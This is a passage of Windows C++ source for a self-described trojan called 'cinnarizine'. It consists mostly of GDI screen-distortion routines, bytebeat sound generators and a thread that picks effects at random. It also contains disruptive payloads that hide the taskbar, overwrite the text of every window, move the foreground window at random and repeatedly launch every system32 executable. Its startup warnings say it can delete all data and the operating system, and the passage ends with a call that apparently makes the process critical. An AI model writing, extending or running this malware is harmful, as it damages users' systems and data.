	BitBlt(hdc, xPower < 0 ? w + xPower : 0, 0, abs(xPower), h, hdc2, xPower > 0 ? w - xPower : 0, 0, dwRop);
	BitBlt(hdc, 0, yPower < 0 ? h + yPower : 0, w, abs(yPower), hdc2, 0, yPower > 0 ? h - yPower : 0, dwRop);
	DeleteDC(hdc2);
	DeleteObject(hbit);
}

DWORD WINAPI shake(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		for (int angle = 0; angle < 361; angle++) {
			int x = 100 * cos(angle * M_PI / 180.F);
			int y = 100 * sin(angle * M_PI / 180.F);
			train(hdc, w, h, x, y, SRCERASE);
		}
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shader8(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int fx = (int)((i ^ 4) + (i * 4) * cbrt(x * x + i * y ^ x * i * y * i));
				rgbquad[index].rgbRed += fx;
				rgbquad[index].rgbGreen += fx;
				rgbquad[index].rgbBlue += fx;
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI shader9(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, NOTSRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			int code = x + y;
			rgbScreen[i].rgb -= ((code) * (code));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, NOTSRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI shader10(LPVOID lpParam) {
	HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	BITMAPINFO bmi = { 40, sw, sh, 1, 24 };
	PRGBTRIPLE rgbtriple;
	double angle = 0;
	for (;;) {
		HDC desk = GetDC(0);
		HDC deskMem = CreateCompatibleDC(desk);
		HBITMAP hbit = CreateDIBSection(desk, &bmi, 0, (void**)&rgbtriple, 0, 0);
		SelectObject(deskMem, hbit);
		BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
		for (int i = 0; i < sw * sh; i++) {
			int x = i % sw, y = i / sh, t = y ^ y | x;
			rgbtriple[i].rgbtRed += 225;
			rgbtriple[i].rgbtGreen += 225;
			rgbtriple[i].rgbtBlue += 225;
		}
		BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
		HDC hcdc = CreateCompatibleDC(desk);
		HBITMAP hbit2 = CreateCompatibleBitmap(desk, sw, sh);
		SelectObject(hcdc, hbit2);
		BitBlt(hcdc, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
		for (float z = 0; z < sw + sh; z += 0.99f) {
			int a = sin(angle) * 20;
			BitBlt(hcdc, 0, z, sw, 1, hcdc, a, z, SRCCOPY);
			angle += M_PI / 40;
			DeleteObject(&z); DeleteObject(&a);
		}
		BitBlt(desk, 0, 0, sw, sh, hcdc, 0, 0, SRCCOPY);
		DeleteObject(hbit2); DeleteObject(hcdc);
		ReleaseDC(wnd, desk);
		DeleteDC(desk); DeleteDC(deskMem); DeleteObject(hbit); DeleteObject(wnd); DeleteObject(rgbtriple); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&bmi);
	}
}

DWORD WINAPI cur1(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int sw = GetSystemMetrics(0);
		int sh = GetSystemMetrics(1);
		LPCWSTR cur[] = { IDC_APPSTARTING, IDC_ARROW, IDC_CROSS, IDC_HAND, IDC_HELP, IDC_IBEAM, IDC_ICON, IDC_NO, IDC_SIZE, IDC_SIZEALL, IDC_SIZENESW, IDC_SIZENS, IDC_SIZENWSE, IDC_SIZEWE, IDC_UPARROW, IDC_WAIT };
		int count = rand() % 16;
		DrawIconEx(hdc, rand() % sw, rand() % sh, LoadCursor(0, cur[count]), (rand() % 5 + 1) * GetSystemMetrics(11), (rand() % 5 + 1) * GetSystemMetrics(12), NULL, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI payload(LPVOID lpParam) {
	srand(time(0));
	while (true) {
		int count = rand() % 20 + 1;
		if (count == 1) {
			HANDLE thread1 = CreateThread(0, 0, plgblt, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
		}
		if (count == 2) {
			HANDLE thread2 = CreateThread(0, 0, gdi2, 0, 0, 0);
			HANDLE thread2dot1 = CreateThread(0, 0, polygon, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			TerminateThread(thread2dot1, 0);
			CloseHandle(thread2dot1);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
		}
		if (count == 3) {
			HANDLE thread3 = CreateThread(0, 0, shader1, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
		}
		if (count == 4) {
			HANDLE thread4 = CreateThread(0, 0, hell1, 0, 0, 0);
			HANDLE thread4dot1 = CreateThread(0, 0, icons, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			TerminateThread(thread4dot1, 0);
			CloseHandle(thread4dot1);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
		}
		if (count == 5) {
			HANDLE thread5 = CreateThread(0, 0, shader2, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
		}
		if (count == 6) {
			HANDLE thread6 = CreateThread(0, 0, shader3, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
		}
		if (count == 7) {
			HANDLE thread7 = CreateThread(0, 0, shader4, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
		}
		if (count == 8) {
			HANDLE thread8 = CreateThread(0, 0, hsl1, 0, 0, 0);
			HANDLE thread8dot1 = CreateThread(0, 0, shell32, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
			TerminateThread(thread8dot1, 0);
			CloseHandle(thread8dot1);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
		}
		if (count == 9) {
			HANDLE thread9 = CreateThread(0, 0, wave, 0, 0, 0);
			HANDLE thread9dot1 = CreateThread(0, 0, beziers, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
			TerminateThread(thread9dot1, 0);
			CloseHandle(thread9dot1);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
		}
		if (count == 10) {
			HANDLE thread10 = CreateThread(0, 0, gdi10, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread10, 0);
			CloseHandle(thread10);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
		}
		if (count == 11) {
			HANDLE thread11 = CreateThread(0, 0, shader5, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread11, 0);
			CloseHandle(thread11);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
		}
		if (count == 12) {
			HANDLE thread12 = CreateThread(0, 0, shader6, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread12, 0);
			CloseHandle(thread12);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
		}
		if (count == 13) {
			HANDLE thread13 = CreateThread(0, 0, train, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread13, 0);
			CloseHandle(thread13);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
		}
		if (count == 14) {
			HANDLE thread14 = CreateThread(0, 0, shader7, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread14, 0);
			CloseHandle(thread14);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
		}
		if (count == 15) {
			HANDLE thread15 = CreateThread(0, 0, terabonus, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread15, 0);
			CloseHandle(thread15);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
		}
		if (count == 16) {
			HANDLE thread16 = CreateThread(0, 0, blur, 0, 0, 0);
			HANDLE thread16dot1 = CreateThread(0, 0, textout, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread16, 0);
			CloseHandle(thread16);
			TerminateThread(thread16dot1, 0);
			CloseHandle(thread16dot1);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
		}
		if (count == 17) {
			HANDLE thread17 = CreateThread(0, 0, shake, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread17, 0);
			CloseHandle(thread17);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
		}
		if (count == 18) {
			HANDLE thread18 = CreateThread(0, 0, shader8, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread18, 0);
			CloseHandle(thread18);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
		}
		if (count == 19) {
			HANDLE thread19 = CreateThread(0, 0, shader9, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread19, 0);
			CloseHandle(thread19);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
		}
		if (count == 20) {
			HANDLE thread20 = CreateThread(0, 0, shader10, 0, 0, 0);
			HANDLE thread20dot1 = CreateThread(0, 0, cur1, 0, 0, 0);
			Sleep(rand() % 30000);
			TerminateThread(thread20, 0);
			CloseHandle(thread20);
			TerminateThread(thread20dot1, 0);
			CloseHandle(thread20dot1);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
		}
	}
}

VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t ^ t >> 3) * t >> 5);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t | t * (t >> 8 | t >> 7)) + 64;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t ^ 69) * t >> 8);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(127 * sin(~t >> 2) * ((127 & t * (7 & t >> 10)) < (245 & t * (2 + (5 & t >> 14)))));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * t / (1 + (t >> 9 & t >> 5)) & 128);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t >> 1) * (t ^ t >> 10));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 6) | t >> 7);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound8() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * t | ~t >> 4 & 153);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound9() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(128 * sin((t * (23 * t >> 12 | 21 & 13 | t)) / 20.375) + 128);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound10() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(10 * t & t >> 10 | 2 * t & t >> 5);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound11() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(104 * (t | t | t >> 24) - 90 * (t | t >> 8));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound12() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t ^ t + (-t >> 7));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound13() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 9) - 1 + (t ^ (t >> 4)));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound14() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t & t % 298) ^ t) - t;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound15() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t * 3 | t >> 4 | 1) + (43 & t >> 1 + 10) * 4 ^ 432) - (4 + t & 39 ? 52 : 8);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound16() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 8 | t << 1));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound17() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 2 & 1 | t >> 7));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound18() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t % 128 > t % 86 ? t >> 5 : t >> 7) & t >> 5;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound19() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(3 * (t & t >> 8 | t & t >> 5));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound20() { //credits to anotheraccount
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 44100, 44100, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[44100 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * sin(t >> 5) * .1);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

DWORD WINAPI taskbar(LPVOID lpvd) {
	static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
	ShowWindow(hShellWnd, SW_HIDE);
	return 0;
}

DWORD WINAPI textz(LPVOID lpParam) {
	while (true) {
		BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
		EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
		Sleep(10);
	}
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)string(), SMTO_ABORTIFHUNG, 100, NULL);
	return true;
}

DWORD WINAPI resize(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		SetWindowPos(GetForegroundWindow(), 0, rand() % w, rand() % h, rand() % w, rand() % h, 0);
		ReleaseDC(0, hdc);
		Sleep(500);
	}
}

DWORD WINAPI opener(LPVOID lpParam) {
	WIN32_FIND_DATA data;
	LPCWSTR path = L"C:\\WINDOWS\\system32\\*.exe";
	while (true) {
		HANDLE find = FindFirstFileW(path, &data);
		ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
		while (FindNextFileW(find, &data)) {
			ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
			Sleep(rand() % 5000);
		}
	}
}

int CALLBACK WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
	if (MessageBoxW(NULL, L"Warning! You have ran a randomized trojan known as cinnarizine that has full capacity to delete all of your data and your operating system. By continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it's highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis. Are you sure you want to run this?", L"cinnarizine", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
		ExitProcess(0);
	}
	else {
		if (MessageBoxW(NULL, L"Final warning! This randomized trojan has a lot of destructive potential. You will lose all of your data if you continue and the creator will not be responsible for any of the damage caused. This is not meant to be malicious, but simply for entertainment and educational purposes. Are you sure you want to continue? This is your final chance to stop this program from execution.", L"cinnarizine", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
			ExitProcess(0);
		}
		else {
			srand(time(0));
			ProcessIsCritical();
